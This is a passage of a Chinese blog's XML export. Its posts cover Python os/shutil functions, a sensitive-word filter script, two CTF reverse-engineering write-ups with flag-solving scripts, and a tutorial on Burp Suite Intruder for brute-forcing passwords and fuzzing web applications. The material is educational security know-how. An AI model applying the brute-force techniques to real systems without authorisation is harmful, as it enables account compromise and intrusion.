    <content type="text"><![CDATA[os模块os.sep 可以取代操作系统特定的路径分隔符。windows下为 ‘\‘os.name 字符串指示你正在使用的平台。比如对于Windows，它是’nt’，而对于Linux/Unix用户，它是 ‘posix’os.getcwd() 函数得到当前工作目录，即当前Python脚本工作的目录路径os.getenv() 获取一个环境变量，如果没有返回noneos.putenv(key, value) 设置一个环境变量值os.listdir(path) 返回指定目录下的所有文件和目录名os.remove(path) 函数用来删除一个文件os.system(command) 函数用来运行shell命令os.linesep 字符串给出当前平台使用的行终止符。例如，Windows使用 ‘\r\n’，Linux使用 ‘\n’ 而Mac使用 ‘\r’os.path.split(path) 函数返回一个路径的目录名和文件名os.path.isfile() 和os.path.isdir()函数分别检验给出的路径是一个文件还是目录os.path.exists() 函数用来检验给出的路径是否真地存在os.curdir 返回当前目录 (‘.’)os.mkdir(path) 创建一个目录os.makedirs(path) 递归的创建目录os.chdir(dirname) 改变工作目录到dirnameos.path.getsize(name) 获得文件大小，如果name是目录返回0Los.path.abspath(name) 获得绝对路径os.path.normpath(path) 规范path字符串形式os.path.splitext() 分离文件名与扩展名os.path.join(path,name) 连接目录与文件名或目录os.path.basename(path) 返回文件名os.path.dirname(path) 返回文件路径os.walk(top,topdown=True,onerror=None) 遍历迭代目录os.rename(src, dst) 重命名file或者directory src到dst 如果dst是一个存在的directory, 将抛出OSError. 在Unix, 如果dst在存且是一个file, 如果用户有权限的话，它将被安静的替换. 操作将会失败在某些Unix 中如果src和dst在不同的文件系统中. 如果成功, 这命名操作将会是一个原子操作 (这是POSIX 需要). 在 Windows上, 如果dst已经存在, 将抛出OSError，即使它是一个文件. 在unix，Windows中有效。os.renames(old, new) 递归重命名文件夹或者文件。像rename() shutil 模块shutil.copyfile( src, dst) 从源src复制到dst中去。当然前提是目标地址是具备可写权限。抛出的异常信息为IOException. 如果当前的dst已存在的话就会被覆盖掉shutil.move( src, dst) 移动文件或重命名shutil.copymode( src, dst) 只是会复制其权限其他的东西是不会被复制的shutil.copystat( src, dst) 复制权限、最后访问时间、最后修改时间shutil.copy( src, dst) 复制一个文件到一个文件或一个目录shutil.copy2( src, dst) 在copy上的基础上再复制文件最后访问时间与修改时间也复制过来了，类似于cp –p的东西shutil.copy2( src, dst) 如果两个位置的文件系统是一样的话相当于是rename操作，只是改名；如果是不在相同的文件系统的话就是做move操作shutil.copytree( olddir, newdir, True/Flase)把olddir拷贝一份newdir，如果第3个参数是True，则复制目录时将保持文件夹下的符号连接，如果第3个参数是False，则将在复制的目录下生成物理副本来替代符号连接shutil.rmtree( src ) 递归删除一个目录以及目录内的所有内容]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python替换敏感词]]></title>
    <url>%2F2018%2F07%2F31%2Fpython%E6%9B%BF%E6%8D%A2%E6%95%8F%E6%84%9F%E8%AF%8D%2F</url>
    <content type="text"><![CDATA[思路如下: 首先，从敏感词文件中读取到敏感词汇，放入容器中 如果有标点符号，则把一些没用的标点符号去掉 然后，获取用户输入，判断输入是否包含敏感词汇， 并输出相对应的结果 1234567891011121314151617181920212223242526272829303132333435import osdef filter_words(path): if os.path.isfile(path): with open(path, &apos;r&apos;) as f: words = f.read() words = words.replace(&apos;，&apos;, &apos;&apos;) words = words.replace(&apos;\n&apos;, &apos;&apos;) return wordsdef sense_words(): words = filter_words(&apos;filter.txt&apos;) print(&quot;敏感字内容如下:&quot;) print(&quot;------------------------------------------------------------------&quot;) print(words) print(&quot;------------------------------------------------------------------&quot;) while True: sentence = input(&quot;请输入：&quot;) if sentence == &apos;0&apos;: print(&apos;exit&apos;) break for i in words: if i in sentence: replace = &apos;&apos; for j in range(len(i)): replace = replace + &apos;*&apos; sentence = sentence.replace(i, replace) print(sentence)if __name__ == &quot;__main__&quot;: sense_words()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮ctf-PY交易]]></title>
    <url>%2F2018%2F07%2F27%2F%E5%8D%97%E9%82%AEctf-PY%E4%BA%A4%E6%98%93%2F</url>
    <content type="text"><![CDATA[下载后是一个pyc文件 选择https://tool.lu/pyc/ 进行解密 如下： 只是一个简单的base64加密，得到的py脚本如下： import base64 c = &apos;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&apos; m = c.decode(&quot;base64&quot;) s = &apos;&apos; for i in m: x = ord(i) - 16 x = x ^ 32 s=s+chr(x) print s 只能在python2.X下运行 得到flag：nctf{d3c0mpil1n9_PyC}]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列----Intruder模块(暴力破解口令)]]></title>
    <url>%2F2018%2F07%2F27%2FBurpSuit%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[一、简介 Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 二、模块说明 Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 1：Target 目标选项(Target tab)这个选项是用来配置目标服务器的细节： 2：Positions 位置选项(Positions tab)这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板： 使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。 当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。 你可以使用选项上的按钮来控制位置上的标记： add § — 在当前光标位置插入一个位置标记。 clear § — 删除整个模板或选中的部分模板里的位置标记。 auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。4.refresh — 如果需要，可以刷新编辑器里有颜色的代码。5.clear — 删除整个编辑器内容。 3：Payloads 有效负荷选项(Payloads tab)这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。 选项1：Payload Sets Payload数量类型设置 选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变 选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作 选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。 4：Opetions 选项卡(Options tab) 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。 如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。 如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。 选项2：Request Engine 设置发送请求的线程、超时重试等。 选项3：Attack Results 设置攻击结果的显示。 选项4：Grep - Match 在响应中找出存在指定的内容的一项。 选项5：Grep - Extract 通过正则提取返回信息中的内容。 选项6：Grep - Payloads 这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。 选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮攻防训练平台逆向第四题WxyVM1]]></title>
    <url>%2F2018%2F07%2F27%2FWxyVM1%2F</url>
    <content type="text"><![CDATA[下载文件elf文件，运行输入flag，用ida打开逆向算法： 不是很复杂，可以看出flag长度需要24，最终会和已给出dword_601060进行比较，一致则成功，那么现在只需要看上面的sub_4005B6()函数了： 跟进两个地址进去看一下，发现有已经给出的处理所需数据，只是比较多，有15000个，想了想最后还是决定把数据提出来（其实是没其他办法了==） 最后是逆推py脚本： 那个15000的数组太长了，不好复制，要导出在一个文档里，才能复制完 tmp=[1, 16, 37, 3, 13, 10, 2, 11, 40, 2 ] //太长了只写前十个 final=[196, 52, 34, 177, 211, 17, 151, 7, 219, 55, 196, 6, 29, 252, 91, 237, 152, 223, 148, 216, 179, 132, 204, 8] i = 14997 while i&gt;0: v0 = tmp[i] v3 = tmp[i+2] result = tmp[i+1] if v0 == 1: final[result] -= v3 elif v0 == 2: final[result] += v3 elif v0 == 3: final[result] ^= v3 elif v0 == 4: final[result] /= v3! elif v0 == 5: final[result] ^= final[v3] final[result]&amp;=0xFF //需要注意的地方，因为ascii字符码范围为0~127，可能发生越界 i -= 3 for x in final: print(chr(x), end = &apos;&apos;) 得到flag：nctf{Embr4ce_Vm_j0in_R3} 如果不加final[result]&amp;=0xFF 这句话就会越界，如图： &amp;0xFF到底是什么意思 举个简单的例子: byte[] b = new byte[5]; b[0] = -12; byte 8位二进制 = 1个字节 char 2个字节 short (2个字节) int（4个字节） long（8个字节） float （4个字节） double（8个字节） 计算机存储数据机制：正数存储的二进制原码,负数存储的是二进制的补码。 补码是负数的绝对值反码加1。 比如-12，-12 的绝对值原码是：0000 1100 取反： 1111 0011 加1： 1111 0100 byte –&gt; int 就是由8位变 32 位 高24位全部补1： 1111 1111 1111 1111 1111 1111 1111 0100 ; 0xFF 是计算机十六进制的表示： 0x就是代表十六进制，A B C D E F 分别代表10 11 12 13 14 15 F就是15 一个F 代表4位二进制：可以看做 是 8 4 2 1。 0xFF的二进制表示就是：1111 1111。 高24位补0：0000 0000 0000 0000 0000 0000 1111 1111; -12的补码与0xFF 进行与（&amp;）操作 最后就是0000 0000 0000 0000 0000 0000 1111 0100 转换为十进制就是 244。 byte类型的数字要&amp;0xff再赋值给int类型，其本质原因就是想保持二进制补码的一致性。 当byte要转化为int的时候，高的24位必然会补1，这样，其二进制补码其实已经不一致了，&amp;0xff可以将高的24位置为0，低8位保持原样。这样做的目的就是为了保证二进制数据的一致性。 有人问为什么上面的式子中b[0]不是8位而是32位，因为当系统检测到byte可能会转化成int或者说byte与int类型进行运算的时候，就会将byte的内存空间高位补1（也就是按符号位补位）扩充到32位，再参与运算。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
</search>
